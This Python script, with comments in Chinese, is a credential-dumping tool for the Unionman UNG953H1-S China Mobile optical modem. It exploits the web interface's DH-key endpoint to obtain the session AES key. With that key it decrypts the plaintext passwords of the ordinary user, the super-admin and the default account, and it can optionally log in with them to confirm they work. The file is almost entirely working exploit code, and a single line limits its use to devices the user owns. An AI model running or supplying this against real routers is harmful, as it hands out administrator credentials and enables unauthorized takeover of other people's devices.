#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
hsan_tool.py -- UNG953H1-S (九联/Unionman 中国移动光猫, HSANHomeGateway / webcmcc)

对照 ung220z-tool 学到的思路, 但本机是另一套 Web 框架:
  UNG220Z : `.gch` CGI + `sidbg 1 DB decry` 解密配置库
  本机    : `boa/aoaform .cgi` + 会话 DH 密钥, 且直接把账号口令 AES 加密后回显

核心原理:
  1. POST /boaform/web_gen_dh_key.cgi (web_dh_pub 为空)
     -> 返回 auc_private, 记为本次会话 AES-256 密钥
  2. 同一会话 POST /boaform/web_query_user_show.cgi
     -> 返回用该密钥加密的 web_user_name / teleAccount_password 等
  3. 本地用 auc_private 做 AES-256-CBC 解密 (iv = 密文前 16 字节)
     -> 直接得到普通用户 / CMCCAdmin 超管 / 默认账户的明文口令

登录验证 (复现 aes_1.js 的 encryted_pwd):
  口令 -> key = 口令自身 ASCII 的 hex 补齐 32 字节
       -> AES-256-CBC(随机 IV) 加密口令
       -> POST /boaform/web_login_exe.cgi  {web_login_name, web_login_password}
       -> success_telecomadmin = 超管, success_useradmin = 普通用户

仅限在你自己拥有并有权管理的设备上使用。
"""

import argparse
import json
import os
import random
import re
import socket
import sys
import time
import urllib.parse
import urllib.request
import http.cookiejar

try:
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except Exception:
    print("缺少 cryptography, 请先: py -3 -m pip install cryptography", file=sys.stderr)
    raise

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120 Safari/537.36")


def log(tag, msg):
    print("[%s] %-6s %s" % (time.strftime("%H:%M:%S"), tag, msg), flush=True)


# --------------------------------------------------------------------------
# AES helpers
# --------------------------------------------------------------------------
def _aes_cbc_decrypt(key_hex, blob_hex):
    key = bytes.fromhex(key_hex)
    raw = bytes.fromhex(blob_hex)
    iv, ct = raw[:16], raw[16:]
    d = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    pt = d.update(ct) + d.finalize()
    try:
        u = padding.PKCS7(128).unpadder()
        return (u.update(pt) + u.finalize()).decode("utf-8", "replace")
    except Exception:
        return pt.hex()


def encryted_pwd(pwd):
    """等价 aes_1.js encryted_pwd(): 口令自身当密钥做 AES-256-CBC。"""
    h = "".join("%02x" % ord(c) for c in pwd)[:64].ljust(64, "0")
    key = bytes.fromhex(h)
    iv = os.urandom(16)
    padder = padding.PKCS7(128).padder()
    data = padder.update(pwd.encode("utf-8")) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ct = enc.update(data) + enc.finalize()
    return iv.hex() + ct.hex()


# --------------------------------------------------------------------------
# HTTP client
# --------------------------------------------------------------------------
class Client:
    def __init__(self, ip, timeout=8):
        self.ip = ip
        self.timeout = timeout
        self.cj = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cj))

    def _url(self, path):
        return "http://%s%s" % (self.ip, path)

    def get(self, path):
        req = urllib.request.Request(self._url(path), headers={
            "User-Agent": UA,
            "Referer": self._url("/webcmcc/index.html"),
        })
        with self.opener.open(req, timeout=self.timeout) as r:
            return r.read().decode("utf-8", "replace")

    def post(self, path, params):
        body = urllib.parse.urlencode(params).encode()
        req = urllib.request.Request(self._url(path), data=body, headers={
            "User-Agent": UA,
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": self._url("/webcmcc/index.html"),
        })
        with self.opener.open(req, timeout=self.timeout) as r:
            return r.read().decode("utf-8", "replace")


def cgi_body(path):
    return {"mode_name": path, "nonedata": "%.17f" % random.random()}


def parse_result(text):
    m = re.search(r'["\']?result["\']?\s*:\s*["\']([^"\']+)["\']', text or "")
    return m.group(1) if m else None


# --------------------------------------------------------------------------
# 核心: 读取并解密账号口令
# --------------------------------------------------------------------------
def dump_credentials(cli):
    # 1) 同一会话协商 AES key
    body = cgi_body("/boaform/web_gen_dh_key")
    body["web_dh_pub"] = ""
    raw = cli.post("/boaform/web_gen_dh_key.cgi", body)
    key = json.loads(raw)["data"]["auc_private"].lower()
    log("DH", "auc_private = %s" % key)

    # 2) 同一会话拉账号信息
    body = cgi_body("/boaform/web_query_user_show")
    raw = cli.post("/boaform/web_query_user_show.cgi", body)
    data = json.loads(raw).get("data", {})

    # 3) 解密
    out = {}
    for k, v in data.items():
        if isinstance(v, str) and len(v) >= 32:
            try:
                out[k] = _aes_cbc_decrypt(key, v)
            except Exception:
                pass

    label = {
        "web_user_name": "Web 普通用户名",
        "web_tele_account_name": "Web 超管用户名",
        "aucUserAccountPassword": "Web 普通口令",
        "teleAccount_password": "Web 超管口令",
        "defaultAccount_password": "默认账户口令",
    }
    print()
    for k, v in out.items():
        log("DATA", "%-18s = %s" % (label.get(k, k), v))
    return out


# --------------------------------------------------------------------------
# 登录验证
# --------------------------------------------------------------------------
def login(cli, user, pwd, path):
    cgi = path + "web_login_exe"
    body = cgi_body(cgi)
    body["web_login_name"] = user
    body["web_login_password"] = encryted_pwd(pwd)
    return parse_result(cli.post(cgi + ".cgi", body))


def try_login(cli, user, pwd):
    last = None
    for path in ("/aoaform/", "/boaform/"):
        try:
            res = login(cli, user, pwd, path)
        except Exception as e:
            log("WARN", "登录失败 %s: %s" % (path, e))
            continue
        last = res
        if res and res.startswith("success"):
            return res
    return last


def logout(cli):
    for path in ("/boaform/", "/aoaform/"):
        try:
            body = cgi_body(path + "web_logout_ext")
            body["user_level"] = "1"
            body["type"] = "manual"
            cli.post(path + "web_logout_ext.cgi", body)
            return
        except Exception:
            pass


# --------------------------------------------------------------------------
# 杂项
# --------------------------------------------------------------------------
def probe_port(ip, port, timeout=3):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        return True
    except Exception:
        return False
    finally:
        s.close()


def main():
    ap = argparse.ArgumentParser(description="UNG953H1-S 凭据读取 (HSAN webcmcc)")
    ap.add_argument("-i", "--ip", default="192.168.1.1")
    ap.add_argument("--verify", action="store_true", help="拿到口令后回登验证")
    a = ap.parse_args()

    log("INFO", "目标 %s" % a.ip)
    log("PROBE", "TCP 80 -> %s" % ("open" if probe_port(a.ip, 80) else "closed"))
    log("PROBE", "TCP 23 -> %s" % ("open" if probe_port(a.ip, 23) else "closed"))

    cli = Client(a.ip)
    creds = dump_credentials(cli)

    user = creds.get("web_user_name")
    upass = creds.get("aucUserAccountPassword") or creds.get("defaultAccount_password")
    admin = creds.get("web_tele_account_name")
    apass = creds.get("teleAccount_password")

    print()
    if admin and apass:
        log("OK", "Web 超管: %s / %s" % (admin, apass))
    if user and upass:
        log("OK", "Web 普通: %s / %s" % (user, upass))
    log("OK", "管理地址: http://%s/" % a.ip)

    if a.verify:
        print()
        if admin and apass:
            logout(cli)
            res = try_login(cli, admin, apass)
            log("VERIFY", "超管 %s -> %s" % (admin, res))
        if user and upass:
            logout(cli)
            res = try_login(cli, user, upass)
            log("VERIFY", "普通 %s -> %s" % (user, res))
    return 0


if __name__ == "__main__":
    sys.exit(main())
